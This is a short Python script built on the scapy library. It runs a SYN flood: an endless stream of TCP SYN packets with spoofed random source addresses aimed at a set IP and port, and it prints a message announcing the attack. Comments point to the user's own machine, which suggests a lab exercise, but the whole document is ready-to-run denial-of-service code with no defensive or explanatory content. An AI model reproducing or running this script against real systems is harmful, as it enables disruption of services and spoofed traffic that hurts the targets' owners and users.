from scapy.all import *
import random
import time

target_ip = "192.168.18.3"  # CHANGE this to your machine's IP
target_port = 80            # You can pick a port (80 = HTTP, or anything open)

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def attack():
    while True:
        ip = IP(src=random_ip(), dst=target_ip)
        tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")  # SYN flag
        packet = ip/tcp
        send(packet, verbose=False)
        time.sleep(0.01)  # small delay to avoid crashing your network immediately

if __name__ == "__main__":
    print(f"Starting SYN flood attack on {target_ip}:{target_port}...")
    attack()
